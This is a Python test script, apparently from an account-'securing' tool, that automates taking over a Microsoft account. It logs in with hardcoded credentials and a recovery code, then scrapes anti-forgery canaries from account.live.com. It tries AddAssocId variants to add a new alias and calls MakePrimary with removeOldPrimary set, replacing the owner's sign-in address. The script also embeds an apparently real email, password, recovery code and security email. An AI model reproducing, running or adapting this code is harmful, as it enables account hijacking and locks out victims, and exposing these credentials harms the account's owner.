#!/usr/bin/env python3
"""Live diagnostic + primary-alias test. Run from /root/autosecure."""
from __future__ import annotations

import asyncio
import json
import re
import sys
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import httpx

from securing.auth.initial_session import get_session
from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_livedata import livedata
from securing.utils.login_pwd import login_pwd
from securing.auth.handle_redirects import handle_redirects, get_data
from securing.auth.polish_host import polish_host
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.security.change_primary_alias import (
    change_primary_alias,
    _get_manage,
    _extract_canary,
    _emails_from_manage,
)


EMAIL = "amazing_fam.iyq28s64@outlook.com"
PASSWORD = "NZ6b0bbGHapxOFpv"
RECOVERY = "J5UKS-YF48X-CNYK5-9F88W-MRZZG"
SEC_EMAIL = "1bdeb6166728@ilovevbucks.site"


def _snip(text: str, n: int = 400) -> str:
    t = re.sub(r"\s+", " ", text or "")[:n]
    return t


def _page_id(text: str) -> str | None:
    m = re.search(r'PageID"\s+content="([^"]+)"', text or "")
    if m:
        return m.group(1)
    m = re.search(r'"pageId"\s*:\s*"([^"]+)"', text or "")
    return m.group(1) if m else None


async def _login(session: httpx.AsyncClient) -> bool:
    live = await livedata(session)
    page = await login_pwd(session, EMAIL, live["urlPost"], PASSWORD, live["ppft"])
    msa = get_data(page)
    if not msa:
        handled = await handle_redirects(session, page)
        if isinstance(handled, dict) and handled.get("urlPost"):
            msa = handled
        elif isinstance(handled, str):
            msa = get_data(handled)
    if not msa or not msa.get("urlPost"):
        if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
            msa = {"_cookies_only": True}
        else:
            print("[X] login failed, no MSAAUTH")
            print(" pageId=", _page_id(page), "snip=", _snip(page))
            return False
    try:
        await polish_host(session, msa)
    except Exception as e:
        print("[!] polish:", e)
    print("[+] logged in")
    return True


async def _probe(session: httpx.AsyncClient) -> None:
    print("\n=== PROBE account.live.com pages ===")
    for url in (
        "https://account.live.com/password/reset",
        "https://account.live.com/names/manage",
        "https://account.live.com/AddAssocId",
        "https://account.live.com/proofs/manage/additional",
        "https://account.live.com/",
    ):
        try:
            r = await session.get(url, follow_redirects=True)
            can = _extract_canary(r.text or "")
            api = None
            m = re.search(r'"apiCanary":"([^"]+)"', r.text or "")
            if m:
                api = m.group(1)[:40] + "…"
            emails = _emails_from_manage(r.text or "") if "names" in url else []
            print(
                f"GET {url}\n"
                f"  final={r.url} status={r.status_code} len={len(r.text or '')} "
                f"pageId={_page_id(r.text)} canary={bool(can)} apiCanary={api} "
                f"emails={emails[:5]}\n"
                f"  snip={_snip(r.text, 220)}"
            )
        except Exception as e:
            print(f"GET {url} EXC {e}")


async def _try_add_with_canaries(session: httpx.AsyncClient, apicanary: str) -> None:
    local = f"sunny{uuid.uuid4().hex[:12]}"
    full = f"{local}@outlook.com"
    print(f"\n=== TRY AddAssocId variants for {full} ===")

    # Collect candidate canaries
    candidates: list[tuple[str, str]] = []
    if apicanary:
        candidates.append(("apicanary", apicanary))

    for url in (
        "https://account.live.com/password/reset",
        "https://account.live.com/names/manage",
        "https://account.live.com/AddAssocId",
        "https://account.live.com/proofs/Manage",
    ):
        r = await session.get(url, follow_redirects=True)
        c = _extract_canary(r.text or "")
        if c:
            candidates.append((f"form@{url.split('.com')[1][:30]}", c))
        m = re.search(r'"apiCanary":"([^"]+)"', r.text or "")
        if m:
            raw = m.group(1)
            # unescape like get_cookies
            import urllib.parse

            un = re.sub(
                r"\\u([0-9A-Fa-f]{4})",
                lambda mo: chr(int(mo.group(1), 16)),
                urllib.parse.unquote(raw),
            )
            candidates.append((f"api@{url.split('.com')[1][:30]}", un))

    # dedupe by value
    seen = set()
    uniq = []
    for label, val in candidates:
        if val and val not in seen:
            seen.add(val)
            uniq.append((label, val))

    print(f"candidate canaries: {len(uniq)}")
    for label, can in uniq:
        for post_opt in ("NONE", "LIVE"):
            for follow in (False, True):
                resp = await session.post(
                    "https://account.live.com/AddAssocId",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://account.live.com",
                        "Referer": "https://account.live.com/names/manage",
                    },
                    data={
                        "canary": can,
                        "PostOption": post_opt,
                        "SingleDomain": "outlook.com",
                        "UpSell": "",
                        "AddAssocIdOptions": "LIVE",
                        "AssociatedIdLive": local,
                    },
                    follow_redirects=follow,
                )
                loc = resp.headers.get("location", "")
                body = resp.text or ""
                hit = "alias=" in (body + loc).lower() or full.lower() in (body + loc).lower()
                print(
                    f"  [{label}] PostOption={post_opt} follow={follow} "
                    f"status={resp.status_code} alias_hit={hit} "
                    f"loc={loc[:120]!r} snip={_snip(body, 160)}"
                )
                if hit:
                    print("  >>> SUCCESS SIGNAL — verifying manage list")
                    _, _, emails = await _get_manage(session)
                    print("  emails=", emails)
                    # MakePrimary
                    mp = await session.post(
                        "https://account.live.com/API/MakePrimary",
                        headers={
                            "Content-Type": "application/json",
                            "canary": apicanary,
                        },
                        content=json.dumps(
                            {
                                "aliasName": full,
                                "emailChecked": True,
                                "removeOldPrimary": True,
                                "uiflvr": 1001,
                                "scid": 100141,
                                "hpgid": 200176,
                            }
                        ),
                    )
                    print("  MakePrimary", mp.status_code, _snip(mp.text, 300))
                    return full
    return None


async def main():
    session = get_session()
    if not await _login(session):
        # try recovery path via recovery_secure for a full secure (heavy)
        print("password login failed — abort probe")
        return

    await _probe(session)

    try:
        apicanary = await get_cookies(session)
        print("\napicanary from password/reset:", bool(apicanary), (apicanary or "")[:50])
    except Exception as e:
        print("get_cookies failed:", e)
        apicanary = ""

    html, canary, emails = await _get_manage(session)
    print("\n_get_manage canary=", bool(canary), "emails=", emails, "pageId=", _page_id(html))

    # High-level function
    local = f"sunny{uuid.uuid4().hex[:12]}"
    print(f"\n=== change_primary_alias({local}) ===")
    ok = await change_primary_alias(session, local, apicanary or "")
    print("change_primary_alias =>", ok)
    _, _, emails2 = await _get_manage(session)
    print("emails after:", emails2)

    if not ok:
        won = await _try_add_with_canaries(session, apicanary or "")
        print("variant result:", won)
        _, _, emails3 = await _get_manage(session)
        print("emails final:", emails3)


if __name__ == "__main__":
    asyncio.run(main())
